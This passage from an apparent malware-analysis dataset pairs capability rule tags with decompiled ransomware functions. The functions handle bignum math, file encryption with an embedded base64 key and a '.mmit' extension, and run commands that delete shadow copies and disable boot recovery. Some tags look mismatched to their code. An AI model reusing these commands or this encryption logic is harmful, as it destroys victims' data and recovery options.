{\n            *puVar2 = *(&stack0x00000330 + iVar5 * 4);\n            iVar5 = iVar5 + 1;\n            puVar2 = puVar2 + 1;\n        } while (iVar5 < in_stack_0000032c);\n    }\n    puVar2 = &stack0xffffecd4;\n    for (iVar5 = 200; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    iVar5 = 0;\n    puVar2 = &stack0xffffecd4;\n    if (0 < iVar4) {\n        do {\n            *puVar2 = (&fcn.004039b0::var_658h)[iVar5];\n            iVar5 = iVar5 + 1;\n            puVar2 = puVar2 + 1;\n        } while (iVar5 < iVar4);\n    }\n    puVar2 = fcn.004033f0(iVar4, in_stack_ffffecd4);\n    puVar7 = &fcn.004039b0::var_65ch;\n    for (iVar4 = 0xc9; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar7 = *puVar2;\n        puVar2 = puVar2 + 1;\n        puVar7 = puVar7 + 1;\n    }\n    while ((1 < arg_ch && ((&fcn.004039b0::arg_ch)[arg_ch] == 0))) {\n        arg_ch = arg_ch + -1;\n    }\n    uVar3 = 0x80000000;\n    var_cb8h = 0x20;\n    do {\n        if (((&fcn.004039b0::arg_ch)[arg_ch] & uVar3) != 0) break;\n        var_cb8h = var_cb8h + -1;\n        uVar3 = uVar3 >> 1;\n    } while (0 < var_cb8h);\n    var_ccch = 0;\n    var_cd4h = 0;\n    var_cb8h = arg_ch * 0x20 + -0x20 + var_cb8h;\n    if (0 < arg_ch) {\n        var_cc8h = &fcn.004039b0::arg_10h;\n        do {\n            var_cd0h = 0;\n            var_cc4h = 1;\n            do {\n                if ((*var_cc8h & var_cc4h) != 0) {\n                    puVar2 = &stack0xffffeff8;\n                    for (iVar4 = 200; iVar5 = var_65ch,  iVar4 != 0; iVar4 = iVar4 + -1) {\n                        *puVar2 = 0;\n                        puVar2 = puVar2 + 1;\n                    }\n                    iVar4 = 0;\n                    puVar2 = &stack0xffffeff8;\n                    if (0 < var_65ch) {\n                        do {\n                            *puVar2 = (&fcn.004039b0::var_658h)[iVar4];\n                            iVar4 = iVar4 + 1;\n                            puVar2 = puVar2 + 1;\n                        } while (iVar4 < iVar5);\n                    }\n                    puVar2 = &stack0xffffecd4;\n                    for (iVar4 = 200; iVar4 != 0; iVar4 = iVar4 + -1) {\n                        *puVar2 = 0;\n                        puVar2 = puVar2 + 1;\n                    }\n                    iVar4 = 0;\n                    puVar2 = &stack0xffffecd4;\n                    if (0 < in_stack_0000032c) {\n                        do {\n                            *puVar2 = *(&stack0x00000330 + iVar4 * 4);\n                            iVar4 = iVar4 + 1;\n                            puVar2 = puVar2 + 1;\n                        } while (iVar4 < in_stack_0000032c);\n                    }\n                    puVar2 = &stack0xffffe68c;\n                    for (iVar4 = 200; iVar5 = var_984h,  iVar4 != 0; iVar4 = iVar4 + -1) {\n                        *puVar2 = 0;\n                        puVar2 = puVar2 + 1;\n                    }\n                    iVar4 = 0;\n                    puVar2 = &stack0xffffe68c;\n                    if (0 < var_984h) {\n                        do {\n                            *puVar2 = (&fcn.004039b0::var_980h)[iVar4];\n                            iVar4 = iVar4 + 1;\n                            puVar2 = puVar2 + 1;\n                        } while (iVar4 < iVar5);\n                    }\n                    puVar2 = &stack0xffffe368;\n                    puVar7 = puVar2;\n                    for (iVar4 = 200; iVar4 != 0; iVar4 = iVar4 + -1) {\n                        *puVar7 = 0;\n                        puVar7 = puVar7 + 1;\n                    }\n                    iVar4 = 0;\n                    if (0 < var_cc0h) {\n                        do {\n                            *puVar2 = (&fcn.004039b0::var_330h)[iVar4];\n                            iVar4 = iVar4 + 1;\n                            puVar2 = puVar2 + 1;\n                        } while (iVar4 < var_cc0h);\n                    }\n                    fcn.00402660(var_cc0h, in_stack_ffffe368);\n                    uStack5724 = 0x403d9b;\n                    puVar2 = fcn.00404030(&fcn.004039b0::var_cadh + 1, in_stack_ffffe9ac, in_stack_ffffe9b0);\n                    puVar7 = &fcn.004039b0::var_334h;\n                    for (iVar4 = 0xc9; iVar4 != 0; iVar4 = iVar4 + -1) {\n                        *puVar7 = *puVar2;\n                        puVar2 = puVar2 + 1;\n                        puVar7 = puVar7 + 1;\n                    }\n                    var_cc0h = var_334h;\n                }\n                var_cc4h = var_cc4h * 2;\n                iVar4 = 0;\n                puVar2 = &stack0xfffff968;\n                puVar7 = puVar2;\n                for (iVar5 = 200; iVar1 = var_65ch,  iVar5 != 0; iVar5 = iVar5 + -1) {\n                    *puVar7 = 0;\n                    puVar7 = puVar7 + 1;\n                }\n                iStack1692 = var_65ch;\n                if (0 < var_65ch) {\n                    do {\n                        *puVar2 = (&fcn.004039b0::var_658h)[iVar4];\n                        iVar4 = iVar4 + 1;\n                        puVar2 = puVar2 + 1;\n                    } while (iVar4 < iVar1);\n                }\n                puVar2 = &stack0xfffff644;\n                for (iVar4 = 200; iVar4 != 0; iVar4 = iVar4 + -1) {\n                    *puVar2 = 0;\n                    puVar2 = puVar2 + 1;\n                }\n                iVar4 = 0;\n                iStack2496 = in_stack_0000032c;\n                puVar2 = &stack0xfffff644;\n                if (0 < in_stack_0000032c) {\n                    do {\n                        *puVar2 = *(&stack0x00000330 + iVar4 * 4);\n                        iVar4 = iVar4 + 1;\n                        puVar2 = puVar2 + 1;\n                    } while (iVar4 < in_stack_0000032c);\n                }\n                puVar2 = &stack0xffffeffc;\n                for (iVar4 = 200; iVar5 = var_984h,  iVar4 != 0; iVar4 = iVar4 + -1) {\n                    *puVar2 = 0;\n                    puVar2 = puVar2 + 1;\n                }\n                iVar4 = 0;\n                aiStack4104[0] = var_984h;\n                puVar2 = &stack0xffffeffc;\n                if (0 < var_984h) {\n                    do {\n                        *puVar2 = (&fcn.004039b0::var_980h)[iVar4];\n                        iVar4 = iVar4 + 1;\n                        puVar2 = puVar2 + 1;\n                    } while (iVar4 < iVar5);\n                }\n                puVar2 = &stack0xffffecd8;\n                puVar7 = puVar2;\n                for (iVar4 = 200; iVar5 = var_984h,  iVar4 != 0; iVar4 = iVar4 + -1) {\n                    *puVar7 = 0;\n                    puVar7 = puVar7 + 1;\n                }\n                iVar4 = 0;\n                if (0 < var_984h) {\n                    do {\n                        *puVar2 = (&fcn.004039b0::var_980h)[iVar4];\n                        iVar4 = iVar4 + 1;\n                        puVar2 = puVar2 + 1;\n                    } while (iVar4 < iVar5);\n                }\n                fcn.00402660(iVar5, in_stack_ffffecd8);\n                uStack3308 = 0x403edb;\n                puVar2 = fcn.00404030(&fcn.004039b0::var_cadh + 1, unaff_ESI, unaff_EBX);\n                puVar7 = &fcn.004039b0::var_984h;\n                for (iVar4 = 0xc9; iVar4 != 0; iVar4 = iVar4 + -1) {\n                    *puVar7 = *puVar2;\n                    puVar2 = puVar2 + 1;\n                    puVar7 = puVar7 + 1;\n                }\n                if ((var_984h == 1) && (var_980h == 1)) {\n                    if ((var_cadh == '\\0') || ((arg_10h & 1) == 0)) {\n                        piVar6 = var_cbch + 1;\n                        for (iVar4 = 200; iVar4 != 0; iVar4 = iVar4 + -1) {\n                            *piVar6 = 0;\n                            piVar6 = piVar6 + 1;\n                        }\n                        iVar4 = 0;\n                        *var_cbch = var_cc0h;\n                        piVar6 = var_cbch + 1;\n                        if (0 < var_cc0h) {\n                            do {\n                                *piVar6 = (&fcn.004039b0::var_330h)[iVar4];\n                                iVar4 = iVar4 + 1;\n                                piVar6 = piVar6 + 1;\n                            } while (iVar4 < *var_cbch);\n                        }\n                        goto code_r0x00403fa2;\n                    }\n                    goto code_r0x00403fc6;\n                }\n                var_ccch = var_ccch + 1;\n            } while ((var_ccch != var_cb8h) && (var_cd0h = var_cd0h + 1,  var_cd0h < 0x20));\n            var_cd4h = var_cd4h + 1;\n            var_cc8h = var_cc8h + 1;\n        } while (var_cd4h < arg_ch);\n    }\n    if ((var_cadh == '\\0') || ((arg_10h & 1) == 0)) {\n        piVar6 = var_cbch + 1;\n        for (iVar4 = 200; iVar4 != 0; iVar4 = iVar4 + -1) {\n            *piVar6 = 0;\n            piVar6 = piVar6 + 1;\n        }\n        iVar4 = 0;\n        *var_cbch = var_cc0h;\n        piVar6 = var_cbch + 1;\n        if (0 < var_cc0h) {\n            do {\n                *piVar6 = (&fcn.004039b0::var_330h)[iVar4];\n                iVar4 = iVar4 + 1;\n                piVar6 = piVar6 + 1;\n            } while (iVar4 < *var_cbch);\n        }\ncode_r0x00403fa2:\n        fcn.0040640a(in_stack_fffff324);\n        return;\n    }\ncode_r0x00403fc6:\n    uStack3308 = 0x403fd7;\n    fcn.00402510();\n    fcn.0040640a(in_stack_fffff324);\n    return;\n}\n",
        "token_count": 4318
    },
    "00404030": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00404030(int32_t *arg_8h, int32_t arg_ch, int32_t arg_10h)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    bool bVar3;\n    char cVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    int32_t *piVar7;\n    int32_t iVar8;\n    int32_t iVar9;\n    int32_t iVar10;\n    int32_t iVar11;\n    uint *puVar12;\n    uint32_t uVar13;\n    int32_t *piVar14;\n    int32_t iVar15;\n    uint *puVar16;\n    int32_t iVar17;\n    int32_t in_stack_0000032c;\n    int32_t in_stack_00000650;\n    uint in_stack_fffff338;\n    uint auStack2468 [198];\n    uint uStack1676;\n    uint in_stack_fffff988;\n    uint32_t var_670h;\n    uint var_66ch;\n    int32_t var_664h;\n    int32_t *var_660h;\n    uint var_65ch;\n    int32_t var_658h;\n    uint var_654h;\n    int32_t var_330h;\n    uint var_32ch;\n    uint32_t var_4h;\n    \n    var_4h = *0x424008 ^ &stack0xfffffffc;\n    var_660h = arg_8h;\n    var_664h = in_stack_0000032c + -1;\n    iVar11 = in_stack_0000032c + 1;\n    puVar12 = &fcn.00404030::var_32ch;\n    for (iVar8 = 200; iVar8 != 0; iVar8 = iVar8 + -1) {\n        *puVar12 = 0;\n        puVar12 = puVar12 + 1;\n    }\n    if (var_664h < arg_ch) {\n        puVar12 = &fcn.00404030::arg_10h + var_664h;\n        puVar16 = &fcn.00404030::var_32ch;\n        for (iVar8 = arg_ch - var_664h; iVar8 != 0; iVar8 = iVar8 + -1) {\n            *puVar16 = *puVar12;\n            puVar12 = puVar12 + 1;\n            puVar16 = puVar16 + 1;\n        }\n    }\n    var_664h = arg_ch - var_664h;\n    if (var_664h < 1) {\n        var_664h = 1;\n    }\n    var_330h = var_664h;\n    puVar12 = &stack0xfffff65c;\n    puVar16 = puVar12;\n    for (iVar8 = 200; iVar8 != 0; iVar8 = iVar8 + -1) {\n        *puVar16 = 0;\n        puVar16 = puVar16 + 1;\n    }\n    iVar8 = 0;\n    if (0 < in_stack_00000650) {\n        do {\n            *puVar12 = *(&stack0x00000654 + iVar8 * 4);\n            iVar8 = iVar8 + 1;\n            puVar12 = puVar12 + 1;\n        } while (iVar8 < in_stack_00000650);\n    }\n    puVar12 = &stack0xfffff338;\n    puVar16 = puVar12;\n    for (iVar8 = 200; iVar8 != 0; iVar8 = iVar8 + -1) {\n        *puVar16 = 0;\n        puVar16 = puVar16 + 1;\n    }\n    iVar8 = 0;\n    if (0 < var_664h) {\n        do {\n            *puVar12 = (&fcn.00404030::var_32ch)[iVar8];\n            iVar8 = iVar8 + 1;\n            puVar12 = puVar12 + 1;\n        } while (iVar8 < var_664h);\n    }\n    iVar8 = in_stack_0000032c;\n    fcn.00402660(var_664h, in_stack_fffff338);\n    puVar12 = &fcn.00404030::var_32ch;\n    for (iVar9 = 200; iVar9 != 0; iVar9 = iVar9 + -1) {\n        *puVar12 = 0;\n        puVar12 = puVar12 + 1;\n    }\n    if (iVar11 < var_658h) {\n        puVar12 = &fcn.00404030::var_654h + iVar11;\n        puVar16 = &fcn.00404030::var_32ch;\n        for (iVar9 = var_658h - iVar11; iVar9 != 0; iVar9 = iVar9 + -1) {\n            *puVar16 = *puVar12;\n            puVar12 = puVar12 + 1;\n            puVar16 = puVar16 + 1;\n        }\n    }\n    iVar9 = var_658h - iVar11;\n    if (iVar9 < 1) {\n        iVar9 = 1;\n    }\n    var_330h = iVar9;\n    piVar7 = var_660h;\n    for (iVar10 = 200; piVar7 = piVar7 + 1,  iVar10 != 0; iVar10 = iVar10 + -1) {\n        *piVar7 = 0;\n    }\n    *var_660h = 1;\n    if (iVar11 < arg_ch) {\n        arg_ch = iVar11;\n    }\n    if (0 < arg_ch) {\n        piVar14 = &fcn.00404030::arg_10h;\n        piVar7 = var_660h;\n        for (iVar10 = arg_ch; piVar7 = piVar7 + 1,  iVar10 != 0; iVar10 = iVar10 + -1) {\n            *piVar7 = *piVar14;\n            piVar14 = piVar14 + 1;\n        }\n    }\n    *var_660h = arg_ch;\n    iVar15 = 0;\n    puVar12 = &fcn.00404030::var_654h;\n    for (iVar10 = 200; iVar10 != 0; iVar10 = iVar10 + -1) {\n        *puVar12 = 0;\n        puVar12 = puVar12 + 1;\n    }\n    var_658h = 1;\n    if (0 < iVar9) {\n        do {\n            uVar13 = (&fcn.00404030::var_32ch)[iVar15];\n            if (uVar13 != 0) {\n                iVar17 = 0;\n                var_670h = 0;\n                iVar10 = iVar15;\n                if (iVar8 < 1) {\ncode_r0x00404277:\n                    if (iVar10 < iVar11) {\n                        (&fcn.00404030::var_654h)[iVar10] = var_670h;\n                    }\n                }\n                else {\n                    var_670h = 0;\n                    while (iVar10 < iVar11) {\n                        uVar1 = *(&stack0x00000330 + iVar17 * 4);\n                        uVar5 = uVar13 * uVar1;\n                        uVar2 = (&fcn.00404030::var_654h)[iVar10];\n                        uVar6 = uVar5 + (&fcn.00404030::var_654h)[iVar10];\n                        (&fcn.00404030::var_654h)[iVar10] = uVar6 + var_670h;\n                        var_670h = (uVar13 * uVar1 >> 0x20) + CARRY4(uVar5, uVar2) + CARRY4(uVar6, var_670h);\n                        iVar17 = iVar17 + 1;\n                        iVar10 = iVar10 + 1;\n                        if (iVar8 <= iVar17) goto code_r0x00404277;\n                        uVar13 = (&fcn.00404030::var_32ch)[iVar15];\n                    }\n                }\n            }\n            iVar15 = iVar15 + 1;\n        } while (iVar15 < iVar9);\n    }\n    var_658h = iVar11;\n    while ((1 < var_658h && ((&fcn.00404030::var_658h)[var_658h] == 0))) {\n        var_658h = var_658h + -1;\n    }\n    uStack1676 = 0x4042cc;\n    fcn.00402480(&fcn.00404030::var_658h);\n    if (var_660h[200] < 0) {\n        puVar12 = &fcn.00404030::var_32ch;\n        for (iVar9 = 200; iVar9 != 0; iVar9 = iVar9 + -1) {\n            *puVar12 = 0;\n            puVar12 = puVar12 + 1;\n        }\n        var_330h = in_stack_0000032c + 2;\n        (&fcn.00404030::var_32ch)[iVar11] = 1;\n        uStack1676 = 0x40431b;\n        piVar7 = fcn.004022d0(&fcn.00404030::var_330h);\n        piVar14 = var_660h;\n        for (iVar11 = 0xc9; iVar11 != 0; iVar11 = iVar11 + -1) {\n            *piVar14 = *piVar7;\n            piVar7 = piVar7 + 1;\n            piVar14 = piVar14 + 1;\n        }\n    }\n    do {\n        iVar11 = *var_660h;\n        if (iVar11 == iVar8) {\n            iVar9 = 0;\n            piVar7 = var_660h;\n            if (0 < iVar11) {\n                do {\n                    if (piVar7[1] != *(&stack0x00000330 + iVar9 * 4)) goto code_r0x00404378;\n                    iVar9 = iVar9 + 1;\n                    piVar7 = piVar7 + 1;\n                } while (iVar9 < iVar11);\n            }\ncode_r0x00404356:\n            bVar3 = true;\n        }\n        else {\ncode_r0x00404378:\n            cVar4 = fcn.00402c30();\n            if (cVar4 != '\\0') goto code_r0x00404356;\n            bVar3 = false;\n        }\n        if (!bVar3) {\n            fcn.0040640a(in_stack_fffff988);\n            return;\n        }\n        uStack1676 = 0x404373;\n        fcn.00402480(&stack0x0000032c);\n    } while( true );\n}\n",
        "token_count": 2374
    },
    "004043b0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "log keystrokes via raw input data/18af53aa16f24c3fa3538f182ae5df5a"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004043b0(uint *arg_8h, uint32_t arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t *in_ECX;\n    uint32_t uVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    uchar *puVar7;\n    int32_t *piVar8;\n    uint *puVar9;\n    bool bVar10;\n    uint var_4h;\n    \n    iVar2 = *in_ECX;\n    while ((1 < iVar2 && (in_ECX[*in_ECX] == 0))) {\n        iVar2 = *in_ECX + -1;\n        *in_ECX = iVar2;\n    }\n    uVar4 = 0x80000000;\n    iVar2 = 0x20;\n    do {\n        if ((in_ECX[*in_ECX] & uVar4) != 0) break;\n        iVar2 = iVar2 + -1;\n        uVar4 = uVar4 >> 1;\n    } while (0 < iVar2);\n    uVar4 = iVar2 + *in_ECX * 0x20 + -0x20;\n    iVar5 = uVar4 >> 3;\n    iVar2 = iVar5 + 1;\n    if ((uVar4 & 7) == 0) {\n        iVar2 = iVar5;\n    }\n    if (0 < arg_ch) {\n        puVar9 = arg_8h;\n        for (uVar4 = arg_ch >> 2; uVar4 != 0; uVar4 = uVar4 - 1) {\n            *puVar9 = 0;\n            puVar9 = puVar9 + 1;\n        }\n        for (arg_ch = arg_ch & 3; arg_ch != 0; arg_ch = arg_ch - 1) {\n            *puVar9 = 0;\n            puVar9 = puVar9 + 1;\n        }\n    }\n    uVar4 = in_ECX[*in_ECX];\n    bVar10 = uVar4 >> 0x18 != 0;\n    if (bVar10) {\n        *arg_8h = uVar4 >> 0x18;\n    }\n    uVar6 = bVar10;\n    uVar3 = uVar4 >> 0x10 & 0xff;\n    if ((bVar10) || (uVar3 != 0)) {\n        *(uVar6 + arg_8h) = uVar3;\n        bVar10 = true;\n        uVar6 = uVar6 + 1;\n    }\n    uVar3 = uVar4 >> 8 & 0xff;\n    if ((bVar10) || (uVar3 != 0)) {\n        *(uVar6 + arg_8h) = uVar3;\n        bVar10 = true;\n        uVar6 = uVar6 + 1;\n    }\n    if ((bVar10) || ((uVar4 & 0xff) != 0)) {\n        *(uVar6 + arg_8h) = uVar4 & 0xff;\n        uVar6 = uVar6 + 1;\n    }\n    iVar5 = *in_ECX + -2;\n    if (-1 < iVar5) {\n        piVar8 = in_ECX + *in_ECX + -1;\n        puVar7 = arg_8h + uVar6 + 2;\n        do {\n            iVar1 = *piVar8;\n            piVar8 = piVar8 + -1;\n            puVar7[1] = iVar1;\n            *puVar7 = iVar1 >> 8;\n            puVar7[-1] = iVar1 >> 0x10;\n            iVar5 = iVar5 + -1;\n            puVar7[-2] = iVar1 >> 0x18;\n            puVar7 = puVar7 + 4;\n        } while (-1 < iVar5);\n    }\n    return iVar2;\n}\n",
        "token_count": 880
    },
    "00404700": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00404700(void)\n\n{\n    uint16_t uVar1;\n    code *pcVar2;\n    uint16_t *puVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    uint16_t *puVar6;\n    int32_t iVar7;\n    bool bVar8;\n    char *arg_8h;\n    uint arg_8h_00;\n    int16_t var_84h;\n    uint var_82h;\n    uint var_7eh;\n    uint32_t var_4h;\n    \n    var_4h = *0x424008 ^ &stack0xfffffffc;\n    (*_sym.imp.SHELL32.dll_SHEmptyRecycleBinW)(0, 0, 7);\n    pcVar2 = _sym.imp.KERNEL32.dll_WinExec;\n    (*_sym.imp.KERNEL32.dll_WinExec)(\"vssadmin.exe delete shadows /all /quiet\", 0);\n    (*pcVar2)(\"bcdedit.exe /set {default} recoveryenabled no\", 0);\n    (*pcVar2)(\"bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures\", 0);\n    (*pcVar2)(\"bcdedit.exe /set {current} recoveryenabled no\", 0);\n    arg_8h_00 = 0;\n    arg_8h = \"bcdedit.exe /set {current} bootstatuspolicy ignoreallfailures\";\n    (*pcVar2)();\n    puVar6 = 0x420c44;\n    puVar3 = 0x4252c0;\n    do {\n        uVar1 = *puVar3;\n        bVar8 = uVar1 < *puVar6;\n        if (uVar1 != *puVar6) {\ncode_r0x00404786:\n            uVar4 = -bVar8 | 1;\n            goto code_r0x0040478b;\n        }\n        if (uVar1 == 0) break;\n        uVar1 = puVar3[1];\n        bVar8 = uVar1 < puVar6[1];\n        if (uVar1 != puVar6[1]) goto code_r0x00404786;\n        puVar3 = puVar3 + 2;\n        puVar6 = puVar6 + 2;\n    } while (uVar1 != 0);\n    uVar4 = 0;\ncode_r0x0040478b:\n    if (uVar4 != 0) {\n        fcn.00404660(0x4252c0);\n        fcn.0040640a(arg_8h);\n        return;\n    }\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetLogicalDrives)();\n    pcVar2 = _sym.imp.KERNEL32.dll_GetDriveTypeW;\n    iVar7 = 1;\n    do {\n        if ((uVar4 & 1 << (iVar7 & 0x1f)) != 0) {\n            var_84h = iVar7 + 0x41;\n            var_82h = 0x5c003a;\n            fcn.00408980(&var_7eh, 0, 0x7a);\n            iVar5 = (*pcVar2)(&var_84h);\n            if (((iVar5 != 5) && (iVar5 != 6)) && (iVar5 != 1)) {\n                fcn.00404660(&var_84h);\n            }\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 0x1a);\n    fcn.0040640a(arg_8h_00);\n    return;\n}\n",
        "token_count": 791
    },
    "00404850": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Removing unreachable block (ram,0x00404a1e)\n// WARNING: Removing unreachable block (ram,0x00404a32)\n// WARNING: Removing unreachable block (ram,0x00404a6d)\n// WARNING: Removing unreachable block (ram,0x00404a7a)\n// WARNING: Removing unreachable block (ram,0x00404a8a)\n// WARNING: Removing unreachable block (ram,0x00404aa6)\n// WARNING: Removing unreachable block (ram,0x00404ae0)\n// WARNING: Removing unreachable block (ram,0x00404aeb)\n// WARNING: Removing unreachable block (ram,0x00404b68)\n// WARNING: Removing unreachable block (ram,0x00404b7a)\n\nvoid fcn.00404850(void)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint arg_8h;\n    int32_t *in_FS_OFFSET;\n    uchar auStackY38788 [2088];\n    uchar uStackY36700;\n    uint uStackY36684;\n    uint uStackY36680;\n    uchar auStackY36676 [34972];\n    uint uStackY1704;\n    uchar *arg_8h_00;\n    uint in_stack_fffff964;\n    uint var_120h;\n    uint uStack172;\n    uint arg_8h_01;\n    uint var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x41a3fb;\n    var_ch = *in_FS_OFFSET;\n    fcn.00419aa0();\n    *in_FS_OFFSET = &fcn.00404850::var_ch;\n    arg_8h_01 = 3;\n    iVar2 = (*_sym.imp.KERNEL32.dll_CreateFileW)();\n    if (iVar2 != -1) {\n        arg_8h = (*_sym.imp.KERNEL32.dll_GetFileSize)();\n        fcn.00408980();\n        fcn.00408980();\n        fcn.00405e00(0x431630);\n        uStackY36680 = 0xf;\n        uStackY36684 = 0;\n        uStackY36700 = 0;\n        fcn.004014b0(\"AAABAM34JshdToh8IkN6W+NaCxFr5IeOiYj27xdCBwhSAp58DOOsrgfJo/lncb5t5g4w00ZsbgcRf4YRCV0GgsEt9TzL6mHdoTX9lnw2bDXMA6wtUDw0OSJQtdRGeO7tO4KTWkCvqDpZSxAKxwUXK+A4NvWKpoqVG/8TbYnRIYjGd/OtmlkBOtskYdpqa2tbYUs5a2HUOoEStYKEYoPWWebPw7uL6N8tedNCrCJN6lXEGP1ZD8rPBAQh+6lGuT1uWtwHMIAcRJ8Yqc2p6yUEiSkr5GjjFHLE+cVHGgoOGBvTd5nMKMM6ohr0S/ALyeUkBouNNfRxiMP5AIsT4Howt832KaP+lQ==\"\n                     , 0x160);\n        var_4h = 0;\n        fcn.00401b00();\n        arg_8h_00 = &stack0xffff687c;\n        fcn.00401c40(arg_8h_00);\n        uStackY1704 = 0x4049a1;\n        fcn.00401cd0(&fcn.00404850::var_120h, arg_8h_00, in_stack_fffff964);\n        fcn.004013a0();\n        pcVar1 = _sym.imp.KERNEL32.dll_SetFilePointerEx;\n        iVar2 = (*_sym.imp.KERNEL32.dll_SetFilePointerEx)();\n        if (iVar2 == 0) {\n            (*_sym.imp.KERNEL32.dll_CloseHandle)();\n        }\n        else {\n            (*_sym.imp.KERNEL32.dll_ReadFile)();\n            fcn.00405760(arg_8h);\n            fcn.0040cffe(&stack0xffff70bc, 10000, 0x42a0e8, 10000);\n            uStack172 = 0x404bee;\n            fcn.0040a351(&stack0xffff70bc, 10000, L\".mmit\", 10000);\n            (*_sym.imp.KERNEL32.dll_CloseHandle)();\n            (*pcVar1)();\n            (*_sym.imp.KERNEL32.dll_SetEndOfFile)();\n            fcn.0040cef9(0x42a0e8, &stack0xffff70bc);\n        }\n    }\n    *in_FS_OFFSET = var_ch;\n    fcn.0040640a(arg_8h_01);\n    return;\n}\n",
        "token_count": 1136
    },
    "00404c60": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00404c60(uint arg_8h, uint arg_ch)\n\n{\n    int16_t iVar1;\n    uchar uVar2;\n    int32_t iVar3;\n    int16_t *piVar4;\n    int16_t *extraout_ECX;\n    uint32_t extraout_ECX_00;\n    uint32_t extraout_ECX_01;\n    uint32_t uVar5;\n    uint32_t extraout_ECX_02;\n    int32_t *in_FS_OFFSET;\n    bool bVar6;\n    int64_t iVar7;\n    ulong uStackY38900;\n    int16_t *piStackY38892;\n    uint32_t uStackY38888;\n    ulong uStackY38884;\n    int32_t iStackY38872;\n    uchar auStackY38868 [2088];\n    uint32_t uStackY36780;\n    uint uStackY36764;\n    uint32_t uStackY36760;\n    uchar auStackY36756 [20000];\n    uchar auStackY16756 [8192];\n    uchar auStackY8564 [6860];\n    uint uStackY1704;\n    uchar *arg_8h_00;\n    uint in_stack_fffff964;\n    uint var_170h;\n    uint uStack256;\n    int32_t iStack252;\n    uchar *puStack248;\n    uint uStack244;\n    uchar *puStack240;\n    uint uStack236;\n    int32_t iStack232;\n    uint uStack228;\n    uint uStack224;\n    uchar *puStack220;\n    uint uStack216;\n    int32_t iStack212;\n    uint *puStack208;\n    uint uStack204;\n    uchar *puStack200;\n    uint uStack196;\n    int32_t iStack192;\n    uint uStack188;\n    uint uStack184;\n    uchar *puStack180;\n    uint uStack176;\n    int32_t iStack172;\n    uint lpBuffer;\n    uint uStack96;\n    uint32_t uStack92;\n    uint uStack88;\n    uint arg_8h_01;\n    uint var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x41a43b;\n    var_ch = *in_FS_OFFSET;\n    fcn.00419aa0();\n    *in_FS_OFFSET = &fcn.00404c60::var_ch;\n    arg_8h_01 = 3;\n    piStackY38892 = extraout_ECX;\n    iVar3 = (*_sym.imp.KERNEL32.dll_CreateFileW)();\n    if (iVar3 != -1) {\n        iVar7 = fcn.00405800(arg_8h, arg_ch);\n        if (iVar7 == 0) {\n            fcn.00408980();\n            fcn.00408980();\n            uStackY38888 = 0;\n            iStackY38872 = 0;\n            iVar3 = 0;\n            do {\n                uVar2 = fcn.00401960(0, 0xffffffff);\n                *(&fcn.00404c60::lpBuffer + iVar3) = uVar2;\n                iVar3 = iVar3 + 1;\n            } while (iVar3 < 0x40);\n            fcn.00405e00(&fcn.00404c60::lpBuffer);\n            uStackY36760 = 0xf;\n            uStackY36764 = 0;\n            uStackY36780 = uStackY36780 & 0xffffff00;\n            uStack88 = 0x404d75;\n            fcn.004014b0(\"AAABAM34JshdToh8IkN6W+NaCxFr5IeOiYj27xdCBwhSAp58DOOsrgfJo/lncb5t5g4w00ZsbgcRf4YRCV0GgsEt9TzL6mHdoTX9lnw2bDXMA6wtUDw0OSJQtdRGeO7tO4KTWkCvqDpZSxAKxwUXK+A4NvWKpoqVG/8TbYnRIYjGd/OtmlkBOtskYdpqa2tbYUs5a2HUOoEStYKEYoPWWebPw7uL6N8tedNCrCJN6lXEGP1ZD8rPBAQh+6lGuT1uWtwHMIAcRJ8Yqc2p6yUEiSkr5GjjFHLE+cVHGgoOGBvTd5nMKMM6ohr0S/ALyeUkBouNNfRxiMP5AIsT4Howt832KaP+lQ==\"\n                         , 0x160);\n            var_4h = 0;\n            uStack88 = 0x404d8d;\n            fcn.00401b00();\n            arg_8h_00 = &stack0xffff682c;\n            fcn.00401c40(arg_8h_00);\n            uStackY1704 = 0x404db5;\n            fcn.00401cd0(&fcn.00404c60::var_170h, arg_8h_00, in_stack_fffff964);\n            if (0xf < uStackY36760) {\n                uStack92 = uStackY36780;\n                if (0xfff < uStackY36760 + 1) {\n                    uVar5 = uStackY36780;\n                    if ((uStackY36780 & 0x1f) 